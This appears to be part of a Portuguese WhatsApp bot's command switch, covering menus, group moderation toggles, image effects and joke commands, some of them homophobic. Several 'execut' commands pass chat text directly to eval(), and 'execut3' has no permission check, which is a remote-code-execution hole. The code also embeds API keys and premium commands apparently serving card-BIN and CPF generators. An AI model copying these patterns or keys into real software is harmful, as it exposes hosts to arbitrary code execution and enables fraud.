✓Utilidade-diz sua % de gay 

𖣔➣❧${prefix}lindo
✓Utilidade-diz slindoua % de lindo 

𖣔➣❧${prefix}%gostoso
✓Utilidade-diz sua % de gostoso
⊰━━━━━☆𖧹.๋ꪶ🎭ꫂ․๋𖧹☆━━━━━⊱

` 
const menu2 = `  ꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂
bem vindo ${pushname}🎉
👷🏻DONO👷🏻
ᬊ⃔⃕͜ 亇ł❍ 亇❍ᛖł❍Ҡ么↯愛
wa.me/5544998220867
✧═══•❁❀❁•═══✧
𝗣𝗜𝗫: ${prefix}doar
✧═══•❁❀❁•═══✧
𝙗𝙤𝙩 𝙖𝙩𝙞𝙫𝙤 𝙙𝙚𝙨𝙙𝙚: 
⏰${temp}
✧═══•❁❀❁•═══✧
𝙧𝙚𝙥𝙤𝙧𝙩𝙖𝙧 𝙗𝙪𝙜/𝙨𝙪𝙜𝙚𝙨𝙩𝙖̃𝙤: 
${prefix}enviar (descreva)
✧═══•❁❀❁•═══✧
❗sᴇ ɴᴀ̃ᴏ ǫᴜɪᴢᴇʀ ᴠᴇʀ ᴏ ᴍᴇɴᴜ ᴇxᴛᴇɴsᴏ ᴄʟɪǫᴜᴇ ᴇᴍ ᴍᴇɴᴜs❗`


sendButLocation(from, `${menu2}`, `${menu}`, {jpegThumbnail:img}, [{buttonId: `${prefix}dono`, buttonText: {displayText: '👤 CRIADOR'}, type: 1},{buttonId: `${prefix}menu2`, buttonText: {displayText: '📝 MENUS'}, type: 1}])
break
case 'menu2':

const tomioks = `_SELECIONE UM DOS MENUS ABAIXO_` 
let temporalY= tomioka.prepareMessageFromContent(from, {
"listMessage": {
"title": (tomioks),
"description": `*✅prefix: ${prefix}*`,
"buttonText": "MENUS📌",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": '🎉MENU DE NOVIDADES🎉',
"rowId": `${prefix}novid`
},
{
"title": '🔥MENU DE GRUPO/ADMINISTRAÇÃO🔥',
"rowId": `${prefix}grupo`
},
{
"title": '😝MENU DE INTERAÇÃO/JOGOS EM (GRUPO)😝',
"rowId": `${prefix}interativos`
},
{
"title": '🗺️MENU DE IMAGENS🗺️',
"rowId": `${prefix}imagens`
},
{
"title": '💎MENU PREMIUM💎',
"rowId": `${prefix}premium`
},
{
"title": '💎MENU DE LOGOS PREMIUM💎',
"rowId": `${prefix}logopremium`
},
{
"title": '🤖MENU ESPECIFICO DO BOT🤖',
"rowId": `${prefix}especifico`
},
{
"title": '🎱MENU DE OUTROS🎱',
"rowId": `${prefix}outros`
},
{
"title": '🦋MENU DE INTERAÇÃO/GRUPO🦋',
"rowId": `${prefix}ranks`
}
]
}
]                    
}
}, {quoted:tomio})
tomioka.relayWAMessage(temporalY)
break
case 'bolsonaro':
var apikey = `akame`
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
img = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: msg
enviar(`*⏳Em processo⏳*`)
midia = await tomioka.downloadAndSaveMediaMessage(img)
msg = body.slice(7)
akame = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", midia)
resultado = await getBuffer(`https://akamer.herokuapp.com/api/canvas/bolsonaro?img=${akame.display_url}&apikey=${apikey}`)
tomioka.sendMessage(from, resultado, image, {quoted:msg})
} else {
enviar('Marque alguma imagem')
}
break
case 'gp':
if (!isBotGroupAdmins) return enviar(`O BOT PRECISA SER ADM`)
if (!isGroup) return enviar(`SÓ EM GRUPO`)
if (!isGroupAdmins) return enviar(`PRECISA SER ADMININASTROR`)
temporall = tomioka.prepareMessageFromContent(from,{
"listMessage": {
"title": "MENU DO GRUPO ",
"description": "Clique nos botões baixo e envie",
"buttonText": "clique aqui",
"listType": "SINGLE_SELECT",
"sections": [
{
"rows": [
{
"title": 'ABRIR GRUPO',
"rowId": `${prefix}abrir`
},
{
"title": 'FECHAR GRUPO',
"rowId": `${prefix}fechar`
},
{
"title": 'ATIVAR ANTI FAKE',
"rowId": `antifake1`
},
{
"title": 'DESATIVAR ANTI FAKE',
"rowId": `antifake0`
},
{
"title": 'ATIVAR ANTILINK',
"rowId": `${prefix}antilink1`
},
{
"title": 'DESATIVAR ANTI LINK',
"rowId": `${prefix}antilink0`
},
{
"title": 'RESETAR LINK',
"rowId": `${prefix}resetar`
}
]
}
]                    
}
}, {quoted:msg})
tomioka.relayWAMessage(temporall)
break
case 'resetar':
if (!isBotGroupAdmins) return enviar(`O BOT PRECISA SER ADM`)
if (!isGroup) return enviar(`SÓ EM GRUPO`)
if (!isGroupAdmins) return enviar(`PRECISA SER ADMININASTROR`)
tomioka.query({ json: ['action', 'inviteReset', from], expect200: true })
linkgc = await tomioka.groupInviteCode(from)
enviar('link resetado com sucesso!')
break
/*case 'jadibot':
let { WAConnection, MessageType, Mimetype} = require('@adiwajshing/baileys')
let qrcode = require('qrcode')
const fs = require('fs')

listjadibot = [];

const jadibot = async(enviar,tomioka,id) => {
conn = new WAConnection()
conn.logger.level = 'warn'
conn.version = [2, 2123, 8]
conn.browserDescription = [ 'jadibot', '', '3.0' ]
conn.on('qr', async qr => {
let bot = await qrcode.toDataURL(qr, { scale: 8 })
let buffer = new Buffer.from(bot.replace('data:image/png;base64,', ''), 'base64')
bot = await tomioka.sendMessage(id,buffer,MessageType.image,{caption:'Escanea el codigo QR para convertirte en un bot\n*Reglas:*\nEl codigo vence cada 30 segundos asi que intenta ser rapido.'})
setTimeout(() => {
tomioka.deleteMessage(id, bot.key)
},30000)
})
conn.on('connecting', () => {
})
conn.on('open', () => {
const topesd = `Nuevo bot detectado\n\n*Dispositivo*:\n\n ${JSON.stringify(conn.user,null,2)}`
enviar(topesd)
})
await conn.connect({timeoutMs: 30 * 1000})
listjadibot.push(conn.user)
conn.on('chat-update', async (message) => {
require('../tomioka.js')(conn, message)
})
}

const stopjadibot = (enviar) => {
conn = new WAConnection();
conn.close()
enviar('Jadibot apagado')
}

module.exports = {
jadibot,
stopjadibot,
listjadibot
}
break*/
case 'cry':

data = await fetchJson('https://waifu.pics/api/sfw/cry')
hasil = await getBuffer(data.url)
tomioka.sendMessage(from, hasil, MessageType.video, {quoted: msg, mimetype: 'video/gif', thumbnail: null})
break
/*case 'menu':
if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
wew = fs.readFileSync('./assets/foto.png')
tomioka.sendMessage(from, wew, image, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: help(prefix) })
break*/
case 'infodono':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, infodono(prefix) , text, {contextInfo: tomio})
break
case 'testi':
const tp = `GGGGGFFFFGFFFDFGFGFGou`
tomioka.sendMessage(from, tp, text, {quoted: fgif})
break
case 'picpay':

enviar(`pra quem quer um banco e é de menor(minimo 16 anos) :\n\nhttp://www.picpay.com/convite?DYULZN`)  
break
case 'ajudantes':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, ajudantes(prefix) , text, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "AJUDANTES 🥰", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
break
case 'leveis':

if (!isGroup) return enviar('só grupo')
if (!isGroupAdmins && !isOwner) return enviar('so adm pd usar')
if (args.length < 1) return enviar(`Digite da forma correta:\nComando: ${prefix}leveis 1 para ativar `)
if (Number(args[0]) === 1) {
if (isLevelingOn) return enviar('❎O recurso LEVEIS já está ativado no grupo❎')
leveling.push(from)
fs.writeFileSync('./database/json/leveling.json', JSON.stringify(leveling))
enviar('✅O recurso LEVEIS foi ativado✅')
} else if (Number(args[0]) === 0) {
if (!isLevelingOn) return enviar('❎O recurso LEVEIS não está ativado no grupo❎')
leveling.splice(from)
fs.writeFileSync('./database/json/leveling.json', JSON.stringify(leveling))                 
enviar('❌O recurso LEVEIS foi desativado❌')
} else {
enviar(`Digite da forma correta:\nComando: ${prefix}leveis 1, para ativar e 0 para desativar`)
}

break
case 'addxp':

if (!isOwner) return enviar('só o dono pode')
if (!isGroup) return enviar('so grupo')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return
mentioned = msg.message.extendedTextMessage.contextInfo.mentionedJid
pru = '.\n'
for (let _ of mentioned) {
pru += `@${_.split('@')[0]}\n`
}
susp = `Foi adicionado ${args[1]} em xp para @${mentioned[0].split('@')[0]}`
mentions(`${susp}`, mentioned, true)
addLevelingXp((mentioned[0]), Number(args[1]))

break
//levEL ATUAL
case 'level':

if (!isLevelingOn) return enviar(`leveling tem que estar ativado!: ${prefix}leveling 1`)
if (!isGroup) return enviar('só grupo')
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return enviar('bah')
const requiredXp = 7 * Math.round(userLevel) * 13 * userLevel 
resul = `┏━━❉ *NÍVEL* ❉━━\n┣⊱ *Nome* : ${pushname}\n┣⊱ *Número* : wa.me/${sender.split("@")[0]}\n┣⊱ *XP* :  ${userXp}/${requiredXp}\n┣⊱ *Seu nível* : ${userLevel}\n┣⊱ *Patente* : ${patt}\n┗━━━━━━━━━━━━`
enviar(resul)
break 

//////////////
case 'outros':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/outros.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: outros(prefix), thumbnail: fs.readFileSync('./assets/outros.jpg')})
break
case 'mvoz':

if (!isUser) return enviar(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/voz.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: menuvoz(prefix), thumbnail: fs.readFileSync('./assets/voz.jpg')})
break
case 'logopremium':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/logo.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: logos(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'novid':

if (!isUser) return enviar(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/novid.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: novid(prefix), thumbnail: fs.readFileSync('./assets/novid.jpg')})
break
case 'ranks':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/ranke.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: rank(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'customfig':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, custom(prefix) , text, {quoted: msg, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}\n𝐜??𝐦𝐚𝐧𝐝𝐨: ${command}`, 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})
break
case 'interativos':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: interact(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'imagens':

if (!isUser) return enviar(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/image.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: imagens(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'especifico':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/interact.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: especifico(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
case 'efeitos':

if (!isUser) return enviar(`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/efeito.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: efeitoaudio(prefix), thumbnail: fs.readFileSync('./assets/efeito.jpg')})
break
case 'premium':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/premium.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: premiuns(prefix), thumbnail: fs.readFileSync('./assets/premium.jpg')})
break
case 'grupo':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, fs.readFileSync('./assets/adm.jpg'), MessageType.image, {quoted: tomio, contextInfo: tome, caption: grupo(prefix), thumbnail: fs.readFileSync('./assets/botlogo.webp')})
break
/////////////////////
case 'modapk':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
tomioka.sendMessage(from, modapk(prefix), text, { quoted: tomio, contextInfo: tome, thumbnail: fs.readFileSync('./me.jpg') })
break
case 'gbin':

if (!isPremium) return enviar ('só premium')
tomioka.sendMessage(from, gbin(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'gpessoa':

if (!isPremium) return enviar ('só premium')

tomioka.sendMessage(from, gpessoa(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'destrava':


tomioka.sendMessage(from, destrava(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
tomioka.sendMessage(from, destrava2(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
tomioka.sendMessage(from, destrava3(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break

case 'chentai':

if (!isPremium) return enviar ('só premium')

tomioka.sendMessage(from, chentai(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'gcpf':

if (!isPremium) return enviar ('só premium')

tomioka.sendMessage(from, gcpf(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'ytmp4':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (args.length < 1) return enviar ('Cadê o url, hum?')
//if(!isUrl(args[0]) && !args[0].includes('youtu')) return enviar (mess.error.Iv)
anu = await fetchJson(`https://st4rz.herokuapp.com/api/ytv2?url=${args[0]}`, {method: 'get'})
teks = `*Title* : ${anu.title}`
thumb = await getBuffer(anu.thumb)
tomioka.sendMessage(from, thumb, image, {quoted: msg, caption: teks})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: msg})
break
case 'gay2':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)


try {

ppimg = await tomioka.getProfilePicture(`${sender.split('@')[0]}@c.us`)

} catch {

ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'

}          

random = `${Math.floor(Math.random() * 100)}`

boiola = random

if (boiola < 20) {bo = 'hmm... você é hetero 😔'} else if (boiola == 21 ) {bo = '+/- boiola'} else if (boiola == 23 ) {bo = '+/- boiola'} else if (boiola == 24 ) {bo = '+/- boiola'} else if (boiola == 25 ) {bo = '+/- boiola'} else if (boiola == 26 ) {bo = '+/- boiola'} else if (boiola == 27 ) {bo = '+/- boiola'} else if (boiola == 28 ) {bo = '+/- boiola'} else if (boiola == 29 ) {bo = '+/- boiola'} else if (boiola == 30 ) {bo = '+/- boiola'} else if (boiola == 31 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 32 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 33 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 34 ) {bo = 'tenho minha desconfiança...😑'}  else if (boiola == 35 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 36 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 37 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 38 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 39 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 40 ) {bo = 'tenho minha desconfiança...😑'} else if (boiola == 41 ) {bo = 'você é né?😏'} else if (boiola == 42 ) {bo = 'você é né?😏'} else if (boiola == 43 ) {bo = 'você é né?😏'} else if (boiola == 44 ) {bo = 'você é né?😏'} else if (boiola == 45 ) {bo = 'você é né?😏'} else if (boiola == 46 ) {bo = 'você é né?😏'} else if (boiola == 47 ) {bo = 'você é né???'} else if (boiola == 48 ) {bo = 'você é né?😏'} else if (boiola == 49 ) {bo = 'você é né?😏'} else if (boiola == 50 ) {bo = 'você é ou não?🧐'} else if (boiola > 51) {bo = 'você é gay🙈'}

teks = `Você é ${random}% Gay\n\n${bo}`

gay = await getBuffer(`https://api-exteam.herokuapp.com/api/rainbow?img=${ppimg}`)

tomioka.sendMessage(from, gay, image, { quoted: msg, caption: teks})

break

case 'antifake': 

if (!isGroupAdmins) return enviar ('só adm')
if (!isGroup) return enviar ('só grupo')
if (args.length < 1) return enviar ('ativar 1, desativar 0')
if (args[0] === '1') {
if (isAntiFake) return enviar ('「 ❗ 」anti números fakes ativado✔️')
antifake.push(from)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
return enviar ('「 ❗ 」anti números fakes ativado✔️')
}
//Encontrar a posição do grupo no arquivo json
if (args[0] === '0') {
let position = false
Object.keys(antifake).forEach((i) => {
if (antifake[i] === from) {
position = i
}
})
//Apagar o grupo dos dados quando a posição já está definida 
if (position !== undefined) {
antifake.splice(position, 1)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
if (!codeInvite) return enviar ('「 ❗ 」anti números fakes desativado✔️')
}}
break
case 'antifake1': 

if (!isGroupAdmins) return enviar ('só adm')
if (!isGroup) return enviar ('só grupo')
if (isAntiFake) return enviar ('「 ❗ 」anti números fakes ativado✔️')
antifake.push(from)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
return enviar ('「 ❗ 」anti números fakes ativado✔️')

//Encontrar a posição do grupo no arquivo json
break
case 'antifake0': 
let position = false
Object.keys(antifake).forEach((i) => {
if (antifake[i] === from) {
position = i
}
})
//Apagar o grupo dos dados quando a posição já está definida 
if (position !== undefined) {
antifake.splice(position, 1)
fs.writeFileSync('./database/group/antifake.json', JSON.stringify(antifake))
if (!codeInvite) return enviar ('「 ❗ 」anti números fakes desativado✔️')}
break
case 'antiracismo':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (args.length < 1) return enviar ('Hmmmm')
if ((args[0]) === 'on') {
if (isAntiRacismo) return enviar ('O modo antiracismo já está ativo')
antiracismo.push(from)
fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
enviar(`\`\`\`✓Ativado com sucesso o modo antiracismo no grupo\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
antiracismo.splice(from, 1)
fs.writeFileSync('./database/json/antiracismo.json', JSON.stringify(antiracismo))
enviar(`\`\`\`✓Modo antiracismo desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
enviar('On para ativar, Off para desligar')
}
break
case 'modonsfw':

if (!isGroup) return enviar ('só grupo')
if (!isGroupAdmins) return enviar ('só adm')
if (args.length < 1) return enviar ('Hmmmm')
if ((args[0]) === 'on') {
if (isNsfw) return enviar ('O modo nsfw já está ativo')
nsfw.push(from)
fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
enviar(`\`\`\`✓Ativado com sucesso o modo nsfw no grupo\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
nsfw.splice(from, 1)
fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
enviar(`\`\`\`✓Modo nsfw desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
enviar('On para ativar, Off para desligar')
}
break
case 'rtext':

if (args.length < 1) return enviar (mess.blank)
tels5 = body.slice(7)
if (tels5.length > 10) return enviar ('O texto é longo, com até 10 caracteres')
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
buffer = await getBuffer(`https://api.vhtear.com/romancetext?text=${tels5}&apikey=ANTIGRATISNIHANJENKKK`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: tels5})
break
case 'water':

if (args.length < 1) return enviar (mess.blank)
tels = body.slice(7)
if (tels.length > 15) return enviar ('O texto é muito longo, até 20 caracteres')
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tfire?text=${tels}&apikey=xptnbot352`, {method: 'get'})
buffer = await getBuffer(anu.result)
tomioka.sendMessage(from, buffer, image, {quoted: msg})
break
case 'nomegp':

if (args.length < 1) return enviar  ('o nome do grupo é: *${groupMetadata.subject}*')
break
case 'xd':

if (args.length < 1) return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
pinte = body.slice(11)
anu = await fetchJson(`https://api-zeks.harispoppy.com/api/pin?q=${pin}&apikey=APIKEY`, {method: 'get'})
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
var pin = JSON.parse(JSON.stringify(anu.result));
var trest =  pin[Math.floor(Math.random() * pin.length)];
pineq = await getBuffer(trest)
tomioka.sendMessage(from, pineq, image, { caption: '*Pinterest*\n\n*Resultado Pesquisa : '+pinte+'*', contextInfo: null, quoted: tomio, contextInfo: tome})
break
//_Figurinhas customizadas

case 'morto':
case 'morte':

if (!isUser) return enviar (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://api-exteam.herokuapp.com/api/rip?img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('É necessário usar uma imagem')
}
break                                                 
case 'hitler':

var imgbb = require('imgbb-uploader')
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
return enviar ('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
owgi = await tomioka.downloadAndSaveMediaMessage(ger)
anu = await imgbb("2dfc5ed7147aa334e0d8d4e644175256", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu8 = (`https://api-exteam.herokuapp.com/api/hitler?img=${teks}`)
abc = await getBuffer(anu8)
tomioka.sendMessage(from, abc, image, {
quoted: msg
})
} else {
enviar('É necessário usar uma imagem')
}
break    
case 'covidglobal':
get_result = await fetchJson(`http://brizas-api.herokuapp.com/covidmundo?apikey=brizaloka`)
get_result = get_result.resultado
ini_txt = `Países Afetados : ${get_result.paisesAfetados}\n`
ini_txt = `Casos : ${get_result.casos}\n`
ini_txt = `Casos hoje : ${get_result.casos_hoje}\n`
ini_txt = `Mortes : ${get_result.mortes}\n`
ini_txt += `Mortes Hoje : ${get_result.mortes_hojes}\n`
ini_txt += `Recuperados : ${get_result.recuperados}\n`
ini_txt += `Recuperados hoje: ${get_result.recuperados_hoje}\n`
ini_txt += `Recuperados por milhão : ${get_result.recuperadosPorMilhao}\n`
ini_txt += `Ativos : ${get_result.ativos}\n`
ini_txt += `Ativos por milhão : ${get_result.ativosPorMilhao}\n`
ini_txt += `Criticos : ${get_result.criticos}\n`
ini_txt += `Críticos por milhão : ${get_result.criticosPorMilhao}\n`
ini_txt += `Casos por milhão : ${get_result.casosPorMilhao}\n`
ini_txt += `Mortes por milhão : ${get_result.mortesPorMilhao}\n`
ini_txt += `Testes : ${get_result.testes}\n`
ini_txt += `Testes por milhão : ${get_result.testesPorMilhao}\n`
ini_txt += `População : ${get_result.população}\n`
enviar(ini_txt)
break
case 'execut':
if (!isGroupAdmins) return enviar('só Adm')
return eval(`${args.join(' ')}`)
break
case 'executt':
if (args.length < 1) return enviar('cade o text' + `Wa Automate function/função da Wa Automate.\n\nEx: ${prefix}execut `)
if (!isGroupAdmins) return enviar('só Adm')
try {
const waitEval = (cmd) => { return new Promise((resolve, reject) => { eval(cmd) }) }
(async () => { await waitEval(body.slice(8).replace('await ', '')) })()
} catch (error) {
enviar(from, 'deu erro', text)
console.log(color('[EXEC]', 'crimson'), color(`→ Obtive erros no comando ${prefix}${command} → erro - Você pode ignorar.`, 'gold'))
}
break 
case 'execut3':
var konsol = budy.slice(8)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return enviar(bang)
}
try {
enviar(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'de', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
enviar(String(e))
}
break
case 'execut2':
if (!issupre) return 
return eval(`${args.join(' ')}`)
break 

if (!msg.key.fromMe) {
if (isGroup) {
try {
const checkuser = getMsgId(sender)
if (checkuser === undefined) addMsgId(sender)
const name = checkuser
const getmessage = getMsgMessage(sender)
messageContage(sender, 1)      
} catch (err) {
console.error(err)
}
}
}
break
case 'reversevid':
if (!isQuotedVideo) return enviar('Marque um vídeo')
enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')
encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await tomioka.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return enviar(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
tomioka.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: msg })
fs.unlinkSync(ran)
})
break
/*case 'reiniciar':
tomioka 
if (!isOwner) return enviar(mess.only.ownerB)
if ((isMedia && !msg.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
anu = args.join(' ').split('|')
satu = anu[0] !== '' ? anu[0] : `YT`
require('./lib/fetcher.js').createStickerExif(satu)
require('./lib/fetcher.js').modStick(media, tomioka, msg, from)
rano = getRandom('.webp')
enviar('*「 ❗ 」 Espere só um pouquinho migo, está reiniciando...*')
await ffmpeg(`./${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot','Bot')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
enviar(mess.stick)
})
})
